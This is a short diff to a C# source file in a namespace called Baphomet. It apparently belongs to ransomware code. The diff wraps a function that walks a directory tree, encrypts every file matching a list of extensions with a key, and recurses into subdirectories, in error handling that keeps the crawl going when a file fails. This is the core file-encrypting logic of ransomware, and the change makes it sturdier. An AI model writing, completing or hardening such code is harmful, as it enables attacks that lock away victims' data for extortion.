@@ -35,21 +35,26 @@ namespace Baphomet.Utilities
 
             string[] files = Directory.GetFiles(targetPath);
             string[] subDirs = Directory.GetDirectories(targetPath);
-
-            for(int i = 0; i < files.Length; i++)
+            try
             {
-                var extension = Path.GetExtension(files[i]);
-                if (extensionCheck.Contains(extension))
+                for (int i = 0; i < files.Length; i++)
                 {
-                    encryptFileData(files[i], key, targetPath);
+                    var extension = Path.GetExtension(files[i]);
+                    if (extensionCheck.Contains(extension))
+                    {
+                        encryptFileData(files[i], key, targetPath);
+                    }
+                }
+
+                for (int i = 0; i < subDirs.Length; i++)
+                {
+                    directoryRoad(subDirs[i], key);
                 }
             }
-
-            for (int i = 0; i < subDirs.Length; i++)
+            catch(Exception ex)
             {
-                directoryRoad(subDirs[i],key);
+                Console.WriteLine(ex.Message);
             }
-
         }
 
          //archivo valido para cifrar bytes
